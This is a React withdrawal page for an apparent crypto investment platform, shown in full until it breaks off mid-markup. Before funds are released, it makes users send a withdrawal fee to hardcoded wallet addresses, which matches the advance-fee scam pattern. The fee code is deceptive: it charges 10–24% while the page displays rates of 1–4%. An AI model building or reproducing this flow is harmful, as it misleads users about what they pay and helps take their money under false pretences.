"use client";
import { useState, useEffect, useMemo, useCallback } from "react";
import { Banknote, Bitcoin, ChevronRight, X, AlertCircle, Zap, TrendingUp, Copy, CheckCircle2, ShieldCheck } from "lucide-react";
import { toast, Toaster } from "sonner";
import { submitWithdrawal } from "./actions";
import { KYCGuard } from "@/components/KYCGuard";

// ── Types ─────────────────────────────────────────────────────────────────────
type WithdrawMethod = "bank" | "crypto";
type HighlightColor  = "green" | "red";
type ModalStep       = "review" | "pay-fee" | "done";

interface FeeTier    { upTo: number; rate: number; label: string; }
interface FeeInfo    { rate: number; label: string; fee: number; youReceive: number; }
interface Network    { value: string; label: string; }
interface CryptoCoin { value: string; label: string; networks: Network[]; feeWallet: string; }
interface Asset      { _id?: string; symbol: string; quantity: number; }

interface WithdrawDetails {
  method: WithdrawMethod;
  amount: string;
  fee: number;
  feeLabel: string;
  youReceive: number;
  bankName: string;
  accountNumber: string;
  coin: string;
  network: string;
  walletAddress: string;
}

interface ConfirmModalProps {
  open: boolean;
  onClose: () => void;
  onConfirm: () => void;
  loading: boolean;
  details: WithdrawDetails;
}

interface RowProps         { label: string; value: string; highlight?: HighlightColor; }
interface FeeBreakdownProps { amount: string; }
interface FeeTierBadgesProps { currentAmount: string; }

// ── Fee tiers ─────────────────────────────────────────────────────────────────
const FEE_TIERS: FeeTier[] = [
  { upTo: 1_000,    rate: 0.10, label: "2%"  },
  { upTo: 10_000,   rate: 0.16, label: "3%"  },
  { upTo: Infinity, rate: 0.24, label: "4%"  },
];

function gCryptoeeInfo(amount: string): FeeInfo {
  const num = Number(amount);
  if (!num || num <= 0) return { rate: 0, label: "—", fee: 0, youReceive: 0 };
  const tier = FEE_TIERS.find((t) => num <= t.upTo)!;
  const fee       = parseFloat((num * tier.rate).toFixed(2));
  const youReceive = parseFloat((num - fee).toFixed(2));
  return { rate: tier.rate, label: tier.label, fee, youReceive };
}

// ── Bank fee wallet (USDT ERC20 placeholder — replace with real address) ──────
const BANK_FEE_WALLET = "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3"; // ERC20 placeholder

// ── Coins, networks & fee-collection wallets ──────────────────────────────────
// feeWallet: the platform address users send the withdrawal fee TO before release
const cryptoCoins: CryptoCoin[] = [
  {
    value: "BTC",  label: "Bitcoin",
    feeWallet: "bc1qpycmsxnlarnay4jgwa3y535m802qevq7ffnp5x", // placeholder
    networks: [{ value: "BTC",   label: "Bitcoin Network" }],
  },
  {
    value: "ETH",  label: "Ethereum",
    feeWallet: "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3", // placeholder
    networks: [{ value: "ERC20", label: "Ethereum Mainnet (ERC-20)" }],
  },
  {
    value: "USDT", label: "Tether (USDT)",
    feeWallet: "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3", // placeholder
    networks: [
      { value: "ERC20", label: "Ethereum Mainnet (ERC-20)"       },
      { value: "TRC20", label: "Tron Network (TRC-20)"           },
      { value: "BEP20", label: "BNB Smart Chain (BEP-20)"        },
    ],
  },
  {
    value: "BNB",  label: "BNB",
    feeWallet: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", // placeholder
    networks: [{ value: "BEP20", label: "BNB Smart Chain (BEP-20)" }],
  },
  {
    value: "SOL",  label: "Solana",
    feeWallet: "2pSEfZG1SrVRzoVLwMkUGhnRABRiMGa6ycAPLaX8LkAQ", // placeholder
    networks: [{ value: "SOL",   label: "Solana Network"            }],
  },
  {
    value: "ADA",  label: "Cardano",
    feeWallet: "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh00000000000", // placeholder
    networks: [{ value: "ADA",   label: "Cardano Mainnet"           }],
  },
  {
    value: "XRP",  label: "Ripple (XRP)",
    feeWallet: "rN7n3473SaZBCG4dFL83w7PB6fAUhVCJuS", // placeholder
    networks: [{ value: "XRP",   label: "XRP Ledger"                }],
  },
  {
    value: "DOGE", label: "Dogecoin",
    feeWallet: "DHFxZNM3dBrzaKNZxq8fYo8VeqUNtjBKqV", // placeholder
    networks: [{ value: "DOGE",  label: "Dogecoin Network"          }],
  },
  {
    value: "TRX",  label: "TRON (TRX)",
    feeWallet: "TNvmBLTBREMVRaJGcnPF3jcFtdPxKGTkC7", // placeholder
    networks: [{ value: "TRC20", label: "Tron Network (TRC-20)"     }],
  },
  {
    value: "DOT",  label: "Polkadot",
    feeWallet: "15oF4uVJwmo4TdGW7VfQxNLavjCXviqxT9S1MgbjMNHr6Sp5", // placeholder
    networks: [{ value: "DOT",   label: "Polkadot Network"          }],
  },
  {
    value: "SHIB", label: "Shiba Inu (SHIB)",
    feeWallet: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", // placeholder
    networks: [{ value: "ERC20", label: "Ethereum Mainnet (ERC-20)" }],
  },
];

// ── Wallet address validation ─────────────────────────────────────────────────
interface ValidationResult { valid: boolean; message: string; }

function validateWalletAddress(coin: string, network: string, address: string): ValidationResult {
  const addr = address.trim();
  if (!addr) return { valid: false, message: "Wallet address is required." };

  // Regex helpers
  const ETH_RE   = /^0x[0-9a-fA-F]{40}$/;
  const TRON_RE  = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
  const BTC_LEG  = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
  const BTC_SEG  = /^bc1[ac-hj-np-z02-9]{6,87}$/;
  const SOL_RE   = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
  const XRP_RE   = /^r[0-9a-zA-Z]{24,34}$/;
  const ADA_RE   = /^(addr1[a-z0-9]{50,}|Ae2[a-zA-Z0-9]{50,}|DdzFF[a-zA-Z0-9]{80,})$/;
  const DOGE_RE  = /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/;
  const DOT_RE   = /^[1-9A-HJ-NP-Za-km-z]{46,50}$/;

  const ok  = (msg = "") => ({ valid: true,  message: msg });
  const err = (msg: string)  => ({ valid: false, message: msg });

  switch (coin) {
    case "BTC":
      if (BTC_LEG.test(addr) || BTC_SEG.test(addr)) return ok();
      return err("Invalid BTC address. Expected format: starts with 1, 3, or bc1.");

    case "ETH":
    case "SHIB":
      if (ETH_RE.test(addr)) return ok();
      return err("Invalid address. Must start with 0x followed by 40 hex characters.");

    case "USDT":
      if (network === "ERC20") {
        if (ETH_RE.test(addr)) return ok();
        return err("Invalid ERC-20 address. Must be 0x + 40 hex characters.");
      }
      if (network === "TRC20") {
        if (TRON_RE.test(addr)) return ok();
        return err("Invalid TRC-20 address. Must start with T and be 34 characters.");
      }
      if (network === "BEP20") {
        if (ETH_RE.test(addr)) return ok();
        return err("Invalid BEP-20 address. Must be 0x + 40 hex characters.");
      }
      return ok();

    case "BNB":
      if (ETH_RE.test(addr)) return ok();
      return err("Invalid BNB address. Must be 0x + 40 hex characters (BNB Smart Chain).");

    case "SOL":
      if (SOL_RE.test(addr)) return ok();
      return err("Invalid Solana address. Must be 32–44 Base58 characters.");

    case "ADA":
      if (ADA_RE.test(addr)) return ok();
      return err("Invalid ADA address. Must start with addr1, Ae2, or DdzFF.");

    case "XRP":
      if (XRP_RE.test(addr)) return ok();
      return err("Invalid XRP address. Must start with r and be 25–35 characters.");

    case "DOGE":
      if (DOGE_RE.test(addr)) return ok();
      return err("Invalid DOGE address. Must start with D and be 34 characters.");

    case "TRX":
      if (TRON_RE.test(addr)) return ok();
      return err("Invalid TRX address. Must start with T and be 34 characters.");

    case "DOT":
      if (DOT_RE.test(addr)) return ok();
      return err("Invalid DOT address. Must be 46–50 Base58 characters.");

    default:
      if (addr.length >= 20) return ok();
      return err("Address appears too short. Please double-check.");
  }
}

// ── Row ───────────────────────────────────────────────────────────────────────
function Row({ label, value, highlight }: RowProps) {
  const color =
    highlight === "green" ? "text-success" :
    highlight === "red"   ? "text-danger" :
    "text-foreground";
  return (
    <div className="flex justify-between items-center">
      <span className="font-mono text-xs text-slate-400">{label}</span>
      <span className={`font-mono text-xs ${color} ${highlight ? 'font-semibold' : 'font-normal'}`}>{value}</span>
    </div>
  );
}

// ── Copy button ───────────────────────────────────────────────────────────────
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };
  return (
    <button
      onClick={handleCopy}
      className={`flex items-center gap-1.5 px-2.5 py-1.5 rounded-md border transition-all cursor-pointer text-xs font-mono font-semibold tracking-wider flex-shrink-0 ${
        copied
          ? 'bg-success/10 border-success text-success'
          : 'bg-surface-200/50 border-border-default text-slate-400 hover:bg-surface-300 hover:border-slate-500'
      }`}
    >
      {copied ? <CheckCircle2 size={11} /> : <Copy size={11} />}
      {copied ? "COPIED" : "COPY"}
    </button>
  );
}

// ── Confirm Modal (3-step: review → pay fee → confirmed) ──────────────────────
function ConfirmModal({ open, onClose, onConfirm, loading, details }: ConfirmModalProps) {
  const [step, setStep] = useState<ModalStep>("review");
  const [feePaid, sCryptoeePaid]   = useState(false);

  // Reset when modal opens/closes
  useEffect(() => {
    if (open) { setStep("review"); sCryptoeePaid(false); }
  }, [open]);

  if (!open) return null;

  // Determine fee wallet address
  const feeWallet = details.method === "bank"
    ? BANK_FEE_WALLET
    : (cryptoCoins.find(c => c.value === details.coin)?.feeWallet ?? BANK_FEE_WALLET);

  const feeNetworkLabel = details.method === "bank"
    ? "USDT · TRC-20 Network"
    : `${details.coin} · ${details.network || "Network"}`;

  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
      <div className="relative w-full max-w-md bg-card border border-border-default rounded-xl p-6 shadow-xl">
        {/* Close */}
        <button
          onClick={onClose}
          disabled={loading}
          className="absolute top-4 right-4 w-7 h-7 rounded-lg flex items-center justify-center bg-surface-200/50 border border-border-default text-slate-400 hover:bg-surface-300 transition-all cursor-pointer disabled:opacity-50"
        >
          <X size={14} />
        </button>

        {/* Step indicator */}
        <div className="flex gap-1.5 items-center mb-6">
          {(["review", "pay-fee"] as ModalStep[]).map((s, i) => (
            <div key={s} className="flex items-center gap-1.5">
              <div
                className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold font-mono transition-all ${
                  step === s ? 'bg-yellow-500/20 border border-yellow-500 text-yellow-400' :
                  (step === "pay-fee" && s === "review") || step === "done" ? 'bg-success/10 border border-success text-success' : 'bg-surface-200/50 border border-border-default text-slate-400'
                }`}
              >
                {(step === "pay-fee" && s === "review") ? <CheckCircle2 size={11} /> : i + 1}
              </div>
              {i < 1 && (
                <div className={`w-6 h-px transition-all ${
                  step !== "review" ? 'bg-success' : 'bg-border-default'
                }`} />
              )}
            </div>
          ))}
          <span className="font-mono text-xs text-slate-400 ml-2 tracking-wider uppercase">
            {step === "review" ? "Review Details" : "Pay Fee"}
          </span>
        </div>

        {/* ── STEP 1: Review ── */}
        {step === "review" && (
          <>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-7 h-7 rounded-lg bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center">
                <Zap size={13} className="text-yellow-400" />
              </div>
              <h3 className="text-lg font-bold text-foreground">
                Review Withdrawal
              </h3>
            </div>

            <div className="space-y-3 mb-6">
              <Row label="Method" value={details.method === "bank" ? "Bank Transfer" : "Crypto"} />

              {details.method === "bank" && (
                <>
                  <Row label="Bank Name"      value={details.bankName} />
                  <Row label="Account Number" value={`****${details.accountNumber.slice(-4)}`} />
                </>
              )}
              {details.method === "crypto" && (
                <>
                  <Row label="Coin"    value={details.coin} />
                  <Row label="Network" value={details.network} />
                  <Row label="Address" value={`${details.walletAddress.slice(0, 10)}...${details.walletAddress.slice(-6)}`} />
                </>
              )}

              <div className="border-t border-border-default my-3" />
              <Row label="Withdrawal Amount" value={`$${Number(details.amount).toLocaleString()}`} />
              <Row label={`Fee (${details.feeLabel})`} value={`$${details.fee.toLocaleString()}`} highlight="red" />

              <div className="bg-yellow-500/5 border border-yellow-500/20 p-3 rounded-lg flex justify-between items-center">
                <span className="font-mono text-xs text-slate-400 uppercase tracking-wider">You Receive</span>
                <span className="font-mono text-xl font-bold text-yellow-400">
                  ${details.youReceive.toLocaleString()}
                </span>
              </div>

              {/* Fee notice */}
              <div className="flex gap-2 items-start bg-yellow-500/5 border border-yellow-500/15 p-3 rounded-lg">
                <AlertCircle size={12} className="text-yellow-400 mt-0.5 flex-shrink-0" />
                <span className="font-mono text-xs text-slate-400 leading-relaxed">
                  A withdrawal fee of <span className="text-yellow-400 font-bold">${details.fee.toLocaleString()}</span> must be paid separately before your withdrawal is processed.
                </span>
              </div>
            </div>

            <div className="flex gap-3 mt-6">
              <button onClick={onClose} className="flex-1 px-4 py-3 rounded-lg bg-surface-200/50 border border-border-default text-slate-400 hover:bg-surface-300 transition font-mono text-xs font-semibold tracking-wider uppercase">
                Cancel
              </button>
              <button
                onClick={() => setStep("pay-fee")}
                className="flex-1 px-4 py-3 rounded-lg bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 transition font-mono text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-2"
              >
                Pay Fee & Continue <ChevronRight size={13} />
              </button>
            </div>
          </>
        )}

        {/* ── STEP 2: Pay Fee ── */}
        {step === "pay-fee" && (
          <>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-7 h-7 rounded-lg bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center">
                <ShieldCheck size={13} className="text-yellow-400" />
              </div>
              <h3 className="text-lg font-bold text-foreground">
                Pay Withdrawal Fee
              </h3>
            </div>

            {/* Fee amount badge */}
            <div className="text-center bg-yellow-500/5 border border-yellow-500/15 p-4 rounded-lg mb-5">
              <p className="font-mono text-xs text-slate-400 uppercase tracking-wider mb-1">
                Amount Due
              </p>
              <p className="text-3xl font-bold text-yellow-400 mb-1">
                ${details.fee.toLocaleString()}
              </p>
              <p className="font-mono text-xs text-slate-500 tracking-wider">
                {feeNetworkLabel}
              </p>
            </div>

            {/* QR Code */}
            <div className="flex justify-center mb-5">
              <div className="relative w-32 h-32 border border-border-default rounded-lg overflow-hidden bg-surface-200/50 shadow-lg">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(feeWallet)}&bgcolor=1f2937&color=f3f4f6&margin=8`}
                  alt="fee wallet QR"
                  className="w-full h-full"
                />
                <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-6 h-6 bg-surface-200/90 border-2 border-yellow-500 rounded-sm flex items-center justify-center text-xs font-bold text-yellow-400">
                  GB
                </div>
              </div>
            </div>

            {/* Wallet address */}
            <div className="mb-5">
              <p className="font-mono text-xs text-slate-400 uppercase tracking-wider mb-2">
                Send fee to this address
              </p>
              <div className="flex items-center gap-3 bg-surface-200/50 border border-border-default p-3 rounded-lg">
                <span className="flex-1 font-mono text-xs text-slate-300 break-all">
                  {feeWallet}
                </span>
                <CopyButton text={feeWallet} />
              </div>
            </div>

            {/* Confirmation checkbox */}
            <label
              className="flex gap-3 items-start bg-surface-200/50 border border-border-default p-3 rounded-lg cursor-pointer mb-5 transition hover:bg-surface-300/50"
            >
              <input
                type="checkbox"
                checked={feePaid}
                onChange={(e) => sCryptoeePaid(e.target.checked)}
                className="mt-1 cursor-pointer accent-success"
              />
              <span className="font-mono text-xs text-slate-400">
                I confirm I have sent the fee of <span className="text-yellow-400 font-bold">${details.fee.toLocaleString()}</span> to the address above and understand my withdrawal will be processed after verification.
              </span>
            </label>

            <div className="flex gap-3">
              <button
                onClick={() => setStep("review")}
                className="flex-1 px-4 py-3 rounded-lg bg-surface-200/50 border border-border-default text-slate-400 hover:bg-surface-300 transition font-mono text-xs font-semibold tracking-wider uppercase"
              >
                Back
              </button>
              <button
                onClick={onConfirm}
                disabled={!feePaid || loading}
                className={`flex-1 px-4 py-3 rounded-lg font-mono text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-2 transition ${
                  feePaid && !loading
                    ? 'bg-success/20 border border-success text-success hover:bg-success/30'
                    : 'bg-surface-200/50 border border-border-default text-slate-500 cursor-not-allowed opacity-50'
                }`}
              >
                {loading ? (
                  <>
                    <div className="w-3 h-3 border-2 border-success border-t-transparent rounded-full animate-spin" />
                    Submitting...
                  </>
                ) : (
                  <><CheckCircle2 size={13} /> Confirm Withdrawal</>
                )}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

// ── Fee Breakdown ─────────────────────────────────────────────────────────────
function FeeBreakdown({ amount }: FeeBreakdownProps) {
  const { label, fee, youReceive } = useMemo(() => gCryptoeeInfo(amount), [amount]);
  if (!amount || Number(amount) <= 0) {
    return (
      <div className="mt-2 p-3 rounded-lg border border-border-default bg-surface-200/30 font-mono text-xs text-slate-400 tracking-wider">
        Enter an amount to see fee breakdown.
      </div>
    );
  }
  return (
    <div className="mt-2 p-3 rounded-lg border border-border-default bg-surface-200/30 flex flex-col gap-2">
      <div className="flex justify-between">
        <span className="font-mono text-xs text-slate-400">Amount</span>
        <span className="font-mono text-xs text-foreground">${Number(amount).toLocaleString()}</span>
      </div>
      <div className="flex justify-between">
        <span className="font-mono text-xs text-slate-400">Fee ({label})</span>
        <span className="font-mono text-xs text-danger">+${fee.toLocaleString()} (paid separately)</span>
      </div>
      <div className="border-t border-border-default" />
      <div className="flex justify-between">
        <span className="font-mono text-xs text-slate-400">You Receive</span>
        <span className="font-mono text-xs text-yellow-400 font-bold">${youReceive.toLocaleString()}</span>
      </div>
    </div>
  );
}

// ── Tier Badges ───────────────────────────────────────────────────────────────
function FeeTierBadges({ currentAmount }: FeeTierBadgesProps) {
  const num = Number(currentAmount);
  const tiers = [
    { range: "$0–$1K",   rate: "1%", active: num > 0 && num <= 1_000 },
    { range: "$1K–$10K", rate: "2%", active: num > 1_000 && num <= 10_000 },
    { range: "$10K+",    rate: "3%", active: num > 10_000 },
  ];
  return (
    <div className="flex gap-2 mt-2 flex-wrap">
      {tiers.map((tier) => (
        <span key={tier.range} className={`text-xs font-mono font-semibold tracking-wider px-2 py-1 rounded-md transition ${
          tier.active 
            ? 'bg-yellow-500/15 border border-yellow-500/30 text-yellow-400' 
            : 'bg-surface-200/50 border border-border-default text-slate-400'
        }`}>
          {tier.range} → {tier.rate}
        </span>
      ))}
    </div>
  );
}

// ── Shared input style helpers ────────────────────────────────────────────────
const sharedInput: React.CSSProperties = {
  width: "100%", background: "rgba(255,255,255,0.03)",
  border: "1px solid rgba(255,255,255,0.08)", borderRadius: "12px",
  padding: "13px 16px", color: "#f9fafb", fontSize: "14px",
  fontFamily: "'DM Mono', monospace", outline: "none",
  boxSizing: "border-box", transition: "border-color 0.2s, box-shadow 0.2s",
};
const sharedSelect: React.CSSProperties = { ...sharedInput, appearance: "none" as const, cursor: "pointer" };
const fieldLabel: React.CSSProperties = {
  fontSize: "10px", fontFamily: "'DM Mono', monospace", letterSpacing: "0.12em",
  color: "#6b7280", marginBottom: "8px", textTransform: "uppercase" as const, display: "block",
};

const onFocus = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
  e.currentTarget.style.borderColor = "rgba(251,191,36,0.4)";
  e.currentTarget.style.boxShadow   = "0 0 0 3px rgba(251,191,36,0.06)";
};
const onBlur = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
  e.currentTarget.style.borderColor = "rgba(255,255,255,0.08)";
  e.currentTarget.style.boxShadow   = "none";
};

// ── Main Page ─────────────────────────────────────────────────────────────────
function WithdrawContent() {
  const [method,         setMethod]         = useState<WithdrawMethod>("bank");
  const [bankAmount,     setBankAmount]     = useState("");
  const [bankName,       setBankName]       = useState("");
  const [accountNumber,  setAccountNumber]  = useState("");
  const [coin,           setCoin]           = useState("");
  const [network,        setNetwork]        = useState("");
  const [cryptoAmount,   setCryptoAmount]   = useState("");
  const [walletAddress,  setWalletAddress]  = useState("");
  const [walletTouched,  setWalletTouched]  = useState(false);
  const [assets,         setAssets]         = useState<Asset[]>([]);
  const [showConfirm,    setShowConfirm]    = useState(false);
  const [loading,        setLoading]        = useState(false);

  const amount  = method === "bank" ? bankAmount : cryptoAmount;
  const feeInfo = useMemo(() => gCryptoeeInfo(amount), [amount]);

  // Address validation (live, after first blur)
  const addrValidation = useMemo(
    () => (coin && walletAddress ? validateWalletAddress(coin, network, walletAddress) : null),
    [coin, network, walletAddress]
  );
  const addrError = walletTouched && addrValidation && !addrValidation.valid;

  const availableCryptoCoins = useMemo(() => {
    const owned = new Set(assets.filter(a => a.quantity > 0).map(a => a.symbol.toUpperCase()));
    return cryptoCoins.filter(c => owned.has(c.value.toUpperCase()));
  }, [assets]);

  const getNetworks = (coinVal: string): Network[] =>
    cryptoCoins.find(c => c.value === coinVal)?.networks ?? [];

  useEffect(() => {
    if (coin && !availableCryptoCoins.some(c => c.value === coin)) {
      setCoin(""); setNetwork(""); setCryptoAmount("");
      toast.info("Selected coin is not in your balance; please choose another.");
    }
  }, [availableCryptoCoins, coin]);

  const handleCoinChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setCoin(e.target.value);
    setNetwork("");
    setWalletAddress("");
    setWalletTouched(false);
  };

  const handleNetworkChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setNetwork(e.target.value);
    setWalletAddress("");
    setWalletTouched(false);
  };

  useEffect(() => {
    (async () => {
      try {
        const res = await fetch("/api/assets", { credentials: "include" });
        if (!res.ok) {
          const errorText = await res.text();
          console.error(`Asset load failed: ${res.status} ${res.statusText}`, errorText);
          throw new Error(`Failed to load assets: ${res.status}`);
        }
        const data = await res.json();
        const fetched: Asset[] = Array.isArray(data.assets)
          ? data.assets.map((a: any) => ({ symbol: String(a.symbol || a.code || "").toUpperCase(), quantity: Number(a.quantity || 0) }))
          : [];
        setAssets(fetched);
      } catch (err) {
        console.error("Asset load error", err);
      }
    })();
  }, []);

  function buildDetails(): WithdrawDetails {
    return { method, amount, fee: feeInfo.fee, feeLabel: feeInfo.label, youReceive: feeInfo.youReceive, bankName, accountNumber, coin, network, walletAddress };
  }

  function handleProceed(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    // Final address validation guard
    if (method === "crypto") {
      const v = validateWalletAddress(coin, network, walletAddress);
      if (!v.valid) { setWalletTouched(true); toast.error(v.message); return; }
    }
    setShowConfirm(true);
  }

  async function handleConfirm() {
    setLoading(true);
    try {
      const result = await submitWithdrawal(buildDetails());
      if (!result.success) throw new Error(result.message);
      toast.success("Withdrawal submitted — pending admin approval.");
      setShowConfirm(false);
      setBankAmount(""); setBankName(""); setAccountNumber("");
      setCoin(""); setNetwork(""); setCryptoAmount(""); setWalletAddress(""); setWalletTouched(false);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Something went wrong");
    } finally {
      setLoading(false);
    }
  }

  const bankCanProceed   = !!bankAmount && !!bankName && !!accountNumber;
  const cryptoCanProceed = !!coin && !!network && !!cryptoAmount && !!walletAddress &&
    (!walletTouched || (addrValidation?.valid ?? false));

  const methods = [
    { key: "bank"   as WithdrawMethod, icon: <Banknote size={14} />, label: "Bank Transfer" },
    { key: "crypto" as WithdrawMethod, icon: <Bitcoin  size={14} />, label: "Crypto"        },
  ];

  return (
    <>
      <Toaster richColors position="top-center" />

      <ConfirmModal
        open={showConfirm}
        onClose={() => setShowConfirm(false)}
        onConfirm={handleConfirm}
        loading={loading}
        details={buildDetails()}
      />

      <main className="min-h-screen bg-app font-body py-8 px-4 sm:px-6">
        <div className="mx-auto w-full max-w-md bg-card border border-border-default p-6 rounded-xl">

          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-7 h-7 rounded-lg bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center">
                <Zap size={14} className="text-yellow-400" />
              </div>
              <h1 className="text-2xl font-bold text-foreground">
                Withdraw
              </h1>
            </div>
            <p className="text-xs text-slate-400 tracking-wider">
              Select your preferred withdrawal method · Fees paid separately
            </p>
          </div>

          {/* Card */}
          <div className="bg-surface-200/50 border border-border-default p-5 rounded-lg">
            {/* Method Toggle */}
            <div className="flex gap-2 p-1 rounded-lg bg-surface-200/50 border border-border-default mb-6">
              {methods.map(m => {
                const active = method === m.key;
                return (
                  <button
                    key={m.key} type="button" onClick={() => setMethod(m.key)}
                    className={`flex-1 flex items-center justify-center gap-2 rounded-lg px-3 py-2 text-xs font-semibold tracking-wider font-mono transition ${active ? 'border border-yellow-500 bg-yellow-500/10 text-yellow-400' : 'border border-transparent bg-transparent text-slate-400 hover:bg-surface-300'}`}
                  >
                    {m.icon} {m.label.toUpperCase()}
                  </button>
                );
              })}
            </div>

            {/* ── Bank Form ── */}
            {method === "bank" && (
              <form onSubmit={handleProceed} className="flex flex-col gap-4">
                <div>
                  <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Amount (USD)</label>
                  <input
                    type="number" value={bankAmount}
                    onChange={e => setBankAmount(e.target.value)}
                    placeholder="0.00" min="0" step="any" required
                    style={sharedInput} onFocus={onFocus} onBlur={onBlur}
                  />
                  <FeeBreakdown amount={bankAmount} />
                  <FeeTierBadges currentAmount={bankAmount} />
                </div>
                <div>
                  <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Bank Name</label>
                  <input type="text" value={bankName} onChange={e => setBankName(e.target.value)}
                    placeholder="Enter bank name" required style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                </div>
                <div>
                  <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Account Number</label>
                  <input type="text" value={accountNumber} onChange={e => setAccountNumber(e.target.value)}
                    placeholder="Enter account number" required style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                </div>
                <div className="flex gap-2 items-start bg-yellow-500/5 border border-yellow-500/20 p-3 rounded-lg">
                  <AlertCircle size={13} className="text-yellow-400 mt-0.5 flex-shrink-0" />
                  <span className="text-xs text-slate-400 leading-relaxed">
                    Bank withdrawals process within 1–3 business days. A separate fee payment is required before funds are released.
                  </span>
                </div>
                <button type="submit" disabled={!bankCanProceed} className="w-full px-4 py-3 rounded-lg bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 disabled:opacity-50 transition font-mono text-xs font-bold tracking-wider uppercase flex items-center justify-center gap-2">
                  Review Withdrawal <ChevronRight size={14} />
                </button>
              </form>
            )}

            {/* ── Crypto Form ── */}
            {method === "crypto" && (
              <form onSubmit={handleProceed} className="flex flex-col gap-4">
                <div className="flex flex-col gap-3 sm:flex-row">
                  <div style={{ flex: 1 }}>
                    <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Coin</label>
                    <select value={coin} onChange={handleCoinChange} required 
                      className="w-full bg-surface-200/50 border border-border-default rounded-lg px-3 py-3 text-foreground text-sm font-mono outline-none transition hover:border-slate-400 focus:border-yellow-500 focus:shadow-[0_0_0_3px_rgba(251,191,36,0.06)]"
                      onFocus={onFocus} onBlur={onBlur} disabled={availableCryptoCoins.length === 0}>
                      <option value="" disabled>
                        {availableCryptoCoins.length > 0 ? "Select coin" : "No crypto assets"}
                      </option>
                      {availableCryptoCoins.map(c => (
                        <option key={c.value} value={c.value}>{c.label} ({c.value})</option>
                      ))}
                    </select>
                  </div>
                  <div style={{ flex: 1 }}>
                    <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Network</label>
                    <select
                      value={network} onChange={handleNetworkChange}
                      disabled={!coin} required
                      className="w-full bg-surface-200/50 border border-border-default rounded-lg px-3 py-3 text-foreground text-sm font-mono outline-none transition hover:border-slate-400 focus:border-yellow-500 focus:shadow-[0_0_0_3px_rgba(251,191,36,0.06)]"
                      style={{ opacity: !coin ? 0.4 : 1, cursor: !coin ? "not-allowed" : "pointer" }}
                      onFocus={onFocus} onBlur={onBlur}
                    >
                      <option value="" disabled>Select network</option>
                      {getNetworks(coin).map(net => (
                        <option key={net.value} value={net.value}>{net.label}</option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Selected network pill */}
                {network && (
                  <div className="flex items-center gap-2 mt-2 -mb-2">
                    <div className="w-1.5 h-1.5 rounded-full bg-success shadow-sm" />
                    <span className="font-mono text-xs text-success tracking-wider">
                      {getNetworks(coin).find(n => n.value === network)?.label ?? network}
                    </span>
                  </div>
                )}

                <div>
                  <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">Amount (USD equivalent)</label>
                  <input type="number" value={cryptoAmount} onChange={e => setCryptoAmount(e.target.value)}
                    placeholder="0.00" min="0" step="any" required
                    style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                  <FeeBreakdown amount={cryptoAmount} />
                  <FeeTierBadges currentAmount={cryptoAmount} />
                </div>

                <div>
                  <label className="block text-xs text-slate-400 mb-2 font-mono uppercase tracking-wider">
                    {coin ? `${coin} Wallet Address` : "Wallet Address"}
                  </label>
                  <input
                    type="text" value={walletAddress}
                    onChange={e => { setWalletAddress(e.target.value); }}
                    onBlur={e => { setWalletTouched(true); onBlur(e); }}
                    onFocus={onFocus}
                    placeholder={
                      !coin ? "Select a coin first" :
                      network === "ERC20" || network === "BEP20" ? "0x..." :
                      network === "TRC20" ? "T..." :
                      coin === "BTC" ? "1... / 3... / bc1..." :
                      `Enter ${coin} wallet address`
                    }
                    disabled={!coin || !network}
                    required
                    style={{...sharedInput, opacity: (!coin || !network) ? 0.45 : 1, cursor: (!coin || !network) ? "not-allowed" : "text"}}
                  />
                  {/* Inline validation message */}
                  {walletTouched && walletAddress && addrValidation && (
                    <div className={`flex gap-2 items-center mt-2 p-2 rounded-lg border ${
                      addrValidation.valid 
                        ? 'bg-success/5 border-success/20' 
                        : 'bg-danger/5 border-danger/20'
                    }`}>
                      {addrValidation.valid
                        ? <CheckCircle2 size={11} className="text-success flex-shrink-0" />
